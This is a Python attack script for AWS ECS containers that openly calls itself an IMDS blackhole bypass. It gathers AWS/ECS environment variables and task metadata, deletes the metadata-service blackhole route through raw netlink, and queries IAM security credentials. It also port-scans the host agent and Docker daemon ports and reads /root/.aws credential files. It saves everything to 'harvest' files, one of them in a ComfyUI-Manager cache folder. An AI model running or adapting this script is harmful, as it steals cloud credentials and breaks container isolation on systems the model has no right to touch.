#!/usr/bin/env python3
# i5500b: IMDS blackhole bypass ladder + host-side agent surface + full ECS metadata
import os, sys, json, time, subprocess, urllib.request, urllib.error, socket, struct, ctypes, glob

TAG = "i5500"
V = 2
H = {"_meta": {"tag": TAG, "v": V, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               "uid": os.getuid(), "cwd": os.getcwd(), "py": sys.version.split()[0]}}

def sh(cmd, t=6, cap=4000):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:cap]
    except Exception as e:
        return "ERR %r" % e

def http(url, method="GET", headers=None, t=4, limit=100000):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq = urllib.request.Request(url, headers=headers or {}, method=method)
        with op.open(rq, timeout=t) as r:
            return {"code": r.status, "body": r.read(limit).decode("utf8", "replace")[:200000]}
    except urllib.error.HTTPError as e:
        try: b = e.read(3000).decode("utf8", "replace")
        except Exception: b = ""
        return {"code": e.code, "body": b}
    except Exception as e:
        return {"code": -1, "body": type(e).__name__ + ": " + str(e)[:200]}

def cx(ip, port, t=2):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        r = s.connect_ex((ip, port))
        return r
    except Exception as e:
        return "ERR " + type(e).__name__ + ":" + str(e)[:60]
    finally:
        if s:
            try: s.close()
            except Exception: pass

env = dict(os.environ)
H["envsel"] = {k: v for k, v in env.items() if k.startswith(("AWS_", "ECS_"))}

# ---- full ECS metadata bodies ----
v4 = env.get("ECS_CONTAINER_METADATA_URI_V4") or env.get("ECS_CONTAINER_METADATA_URI", "")
H["meta"] = {}
if v4:
    H["meta"]["task"] = http(v4 + "/task", limit=300000)
    H["meta"]["container"] = http(v4, limit=200000)
    H["meta"]["stats"] = {"code": http(v4 + "/stats", t=6)["code"]}
api = env.get("ECS_AGENT_URI", "")
if api:
    H["meta"]["api_root"] = http(api)
    H["meta"]["api_task"] = http(api + "/task")
    H["meta"]["api_meta"] = http(api.rstrip("/") + "/metadata")

# ---- capabilities + kernel ----
st = open("/proc/self/status").read()
caps = {}
for line in st.splitlines():
    if line.startswith(("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs", "Seccomp")):
        k, _, v = line.partition(":")
        caps[k] = v.strip()
H["caps"] = caps
try:
    eff = int(caps.get("CapEff", "0"), 16)
except Exception:
    eff = 0
names = {0: "chown", 1: "dac_override", 2: "dac_read_search", 6: "setgid", 7: "setuid", 10: "net_bind_service",
         12: "net_admin", 13: "net_raw", 16: "sys_module", 21: "sys_admin", 18: "sys_chroot", 19: "sys_ptrace", 23: "sys_nice"}
H["caps"]["decoded"] = sorted(v for b, v in names.items() if eff & (1 << b))
H["bins"] = {b: sh("command -v %s || ls /sbin/%s /usr/sbin/%s 2>/dev/null" % (b, b, b)).strip() for b in ["ip", "iptables", "nft", "busybox", "curl", "wget", "nsenter", "unshare"]}

# ---- pure-python netlink RTM_DELROUTE for the 169.254.169.254 blackhole ----
def nl_delroute(dst_ip="169.254.169.254", table=254):
    RTM_DELROUTE = 25; NLM_F_REQUEST = 1; NLM_F_ACK = 4
    seq = int(time.time()) & 0xffff
    addr = socket.inet_aton(dst_ip)
    attrs = struct.pack("<HH", 4, 1) + addr  # rta_len, rta_type=RTA_DST, addr  (len 8)
    rtmsg = struct.pack("<BBBBBBBBI", socket.AF_INET, 32, 0, 0, table, 4, 0, 1, 0)  # family,dst_len,src_len,tos,table,protocol(RTPROT_STATIC=4),scope,type=RTN_UNICAST,flags
    body = rtmsg + attrs
    hdr = struct.pack("<IHHII", 16 + len(body), RTM_DELROUTE, NLM_F_REQUEST | NLM_F_ACK, seq, 0)
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 0)
    s.settimeout(3)
    try:
        s.sendto(hdr + body, (0, 0))
        d = s.recv(4096)
        ln, ty, fl, sq, pid = struct.unpack("<IHHII", d[:16])
        if ty == 2:  # NLMSG_ERROR
            err = struct.unpack("<i", d[16:20])[0]
            return {"type": "NLMSG_ERROR", "errno": -err, "msg": os.strerror(-err) if err else "ACK"}
        return {"type": ty, "raw": d[:80].hex()}
    except Exception as e:
        return {"err": type(e).__name__ + ": " + str(e)[:200]}
    finally:
        s.close()
H["netlink_delroute"] = nl_delroute()

def unshare_net():
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        CLONE_NEWNET = 0x40000000
        r = libc.unshare(CLONE_NEWNET)
        return {"rc": r, "errno": ctypes.get_errno(), "msg": os.strerror(ctypes.get_errno()) if r else "ok"}
    except Exception as e:
        return {"err": type(e).__name__ + ": " + str(e)[:120]}
H["unshare_net"] = unshare_net()

# ---- routes + IMDS retry after route attempt ----
H["route"] = {"v4": sh("cat /proc/net/route"), "v6": sh("cat /proc/net/ipv6_route | head -6"), "iproute": sh("ip route show table all 2>&1 | head -30")}
H["imds_after"] = {
    "token": http("http://169.254.169.254/latest/api/token", "PUT", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, 4),
    "instance_id": http("http://169.254.169.254/latest/meta-data/instance-id", t=4),
    "roles": http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", t=4),
    "cx80": cx("169.254.169.254", 80),
}

# ---- host-side private IP from metadata, then port map there + gateway ----
host_ip = None
try:
    tb = json.loads(H["meta"]["task"]["body"])
    for c in tb.get("Containers", []):
        for n in c.get("Networks", []):
            for k in ("IPv4Addresses",):
                pass
    host_ip = tb.get("HostPrivateIPv4Address") or tb.get("HostPrivateIPAddress")
    H["meta"]["host_private"] = host_ip
    H["meta"]["subnet_gw"] = None
    for c in tb.get("Containers", []):
        for n in c.get("Networks", []):
            H["meta"]["subnet_gw"] = n.get("SubnetGatewayIpv4Address")
            H["meta"]["self_ip"] = (n.get("IPv4Addresses") or [None])[0]
except Exception as e:
    H["meta"]["parse_err"] = repr(e)

H["probe"] = {}
targets = [("169.254.169.254", [80, 443, 51678]), ("169.254.170.2", [80, 51678]),
           ("169.254.169.253", [53, 80]), ("169.254.169.123", [80]),
           ("169.254.172.1", [80, 51678]), ("172.16.9.1", [80, 443, 51678]),
           ("172.16.10.1", [80, 443, 51678])]
if host_ip:
    targets.append((host_ip, [22, 80, 443, 2375, 2376, 51678, 8080, 9000]))
for ip, ports in targets:
    H["probe"][ip] = {str(p): cx(ip, p) for p in ports}
# HTTP gets to host agent candidates
H["host_http"] = {}
for ip in [x for x in [host_ip, "172.16.9.1", "172.16.10.1"] if x]:
    H["host_http"][ip] = {"m51678": http("http://%s:51678/v1/metadata" % ip, t=3),
                          "m51678t": http("http://%s:51678/v1/tasks" % ip, t=3),
                          "p80": http("http://%s/" % ip, t=2)}
# connect with SO_BINDTODEVICE to eth0 for IMDS
def bind_dev(ip, port, dev="eth0"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
        s.setsockopt(socket.SOL_SOCKET, 25, dev.encode() + b"\x00")
        r = s.connect_ex((ip, port)); s.close(); return r
    except Exception as e:
        return "ERR " + type(e).__name__ + ":" + str(e)[:60]
H["bind_dev_imds80"] = bind_dev("169.254.169.254", 80)
H["ping_imds"] = sh("ping -c1 -W1 169.254.169.254 2>&1 | tail -3")

# ---- static keys + aws files ----
H["aws_files"] = {
    "credentials": sh("cat /root/.aws/credentials 2>&1 | sed -E 's/(AKIA[0-9A-Z]{4})[0-9A-Z]{12}([0-9A-Z]{4})/\\1XXXXXXXXXXXX\\2/g'"),
    "config": sh("cat /root/.aws/config 2>&1"),
    "ls": sh("ls -laR /root/.aws 2>&1 | head -20"),
}

out = json.dumps(H)
for p in ["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json" % TAG,
          os.path.join(os.getcwd(), "%s_harvest.json" % TAG), "/tmp/%s_harvest.json" % TAG]:
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True); open(p, "w").write(out)
    except Exception as e:
        print("[%s] write-fail %r" % (TAG, e), flush=True)
print("[%s] HARVEST " % TAG + out[:120000], flush=True)
